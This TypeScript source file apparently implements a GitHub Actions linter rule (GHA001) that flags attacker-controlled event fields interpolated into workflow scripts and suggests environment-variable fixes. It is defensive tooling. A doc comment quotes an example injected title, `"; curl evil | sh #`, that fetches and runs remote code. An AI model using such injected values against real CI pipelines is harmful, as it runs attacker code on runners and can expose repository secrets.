import { eventsSetting, scenarios } from "../events.js";
import { exposures, rateScript, settingEvents } from "../exposure.js";
import type { Context } from "../exposure.js";
import type { Finding, Severity } from "../types.js";
import { artifactTaint } from "../taint.js";
import { positionIn } from "../workflow.js";
import type { Step, Workflow } from "../workflow.js";

/**
 * Contexts an attacker controls: issue and PR text, branch names, commit
 * messages and author fields. Interpolating them into a shell script lets a
 * crafted title such as `"; curl evil | sh #` run commands in the runner.
 * Based on GitHub's "Security hardening for GitHub Actions" guide.
 */
const untrusted = [
  /^github\.event\.(issue|pull_request|discussion)\.(title|body)$/,
  /^github\.event\.(comment|review|review_comment)\.body$/,
  /^github\.event\.pull_request\.head\.(ref|label|repo\.default_branch)$/,
  /^github\.event\.pages\[[^\]]*\]\.page_name$/,
  /^github\.event\.pages\.\*\.page_name$/,
  /^github\.event\.commits(\[[^\]]*\]|\.\*)\.(message|author\.(email|name))$/,
  /^github\.event\.head_commit\.(message|author\.(email|name))$/,
  /^github\.event\.workflow_run\.(head_branch|head_commit\.(message|author\.(email|name)))$/,
  /^github\.head_ref$/,
];

const expressionRE = /\$\{\{\s*(.*?)\s*\}\}/g;

export interface Injection {
  /** The full `${{ ... }}` text. */
  text: string;
  /** The context path, e.g. github.event.issue.title. */
  context: string;
}

/** Finds untrusted contexts used directly inside a script. */
export function findInjections(script: string): Injection[] {
  const found: Injection[] = [];
  for (const m of script.matchAll(expressionRE)) {
    const context = (m[1] ?? "").trim();
    if (untrusted.some((re) => re.test(context))) {
      found.push({ text: m[0], context });
    }
  }
  return found;
}

/** Derives an environment variable name: github.event.issue.title -> ISSUE_TITLE. */
export function envName(context: string): string {
  const parts = context
    .replace(/\[[^\]]*\]/g, "")
    .split(".")
    .filter((p) => p !== "github" && p !== "event" && p !== "*");
  const tail = parts.slice(-2).join("_");
  return tail.replace(/[^A-Za-z0-9]+/g, "_").toUpperCase();
}

export interface Script {
  text: string;
  /** The YAML scalar holding the script, for exact positions. */
  node: unknown;
  fixable: boolean;
}

/** The scripts a step runs: run: and the script input of actions/github-script. */
export function scripts(step: Step): Script[] {
  const out: Script[] = [];
  if (step.run !== undefined) out.push({ text: step.run, node: step.node.get("run", true), fixable: true });
  // actions/github-script evaluates its `script` input as JavaScript.
  const script = step.with.script;
  if (step.uses?.startsWith("actions/github-script@") && script !== undefined) {
    out.push({ text: script, node: step.node.getIn(["with", "script"], true), fixable: false });
  }
  return out;
}

export function checkInjection(wf: Workflow, ctx: Context): Finding[] {
  const findings: Finding[] = [];
  const events = scenarios(wf);
  const taint = artifactTaint(wf);
  for (const job of wf.jobs) {
    job.steps.forEach((step, index) => {
      for (const { text, node, fixable } of scripts(step)) {
        // Values read from artifacts of the triggering run (workflow_run).
        const seenTaint = new Map<string, number>();
        for (const m of text.matchAll(expressionRE)) {
          // In JavaScript, toJSON() yields a string literal the value cannot break out of.
          const safe = !fixable && /^tojson\s*\(/i.test(m[1] ?? "");
          const hit = safe ? undefined : taint.find(m[1] ?? "", job);
          const n = seenTaint.get(m[0]) ?? 0;
          seenTaint.set(m[0], n + 1);
          if (!hit) continue;
          const rating = rateScript(wf, job, index, ["workflow_run"], ctx);
          if (!rating) continue;
          findings.push({
            ruleId: "GHA001",
            severity: rating.severity,
            file: wf.file,
            ...positionIn(wf, node, m[0], n),
            message: `${hit.ref} is interpolated into a script; it comes from ${hit.chain}, which whoever started that run (for example a fork pull request) can write, so a crafted value can run arbitrary commands${rating.note}`,
            help: "Pass it through an environment variable and validate it (e.g. that a pull request number is numeric) before using it.",
          });
        }
        const seen = new Map<string, number>();
        for (const inj of findInjections(text)) {
          const n = seen.get(inj.text) ?? 0;
          seen.set(inj.text, n + 1);
          const setters = eventsSetting(inj.context);
          const relevant = settingEvents(events, setters);
          let severity: Severity;
          let message = `${inj.context} is interpolated into a script; a crafted value can run arbitrary commands`;
          if (relevant.length === 0) {
            // Still worth fixing, but nothing sets the value for these triggers.
            if (exposures(wf, job, index).length === 0) continue;
            severity = "low";
            message = `${inj.context} is interpolated into a script, but it is only set for ${(setters ?? []).join(", ")} events, which do not trigger this workflow`;
          } else {
            const rating = rateScript(wf, job, index, relevant, ctx);
            if (!rating) continue;
            severity = rating.severity;
            message += rating.note;
          }
          findings.push({
            ruleId: "GHA001",
            severity,
            file: wf.file,
            ...positionIn(wf, node, inj.text, n),
            message,
            help: fixable
              ? `Pass it through an environment variable: env: { ${envName(inj.context)}: ${inj.text} } and use "$${envName(inj.context)}" in the script.`
              : "Read it in JavaScript from context.payload instead of interpolating it into the script.",
            fixable,
          });
        }
      }
    });
  }
  return findings;
}
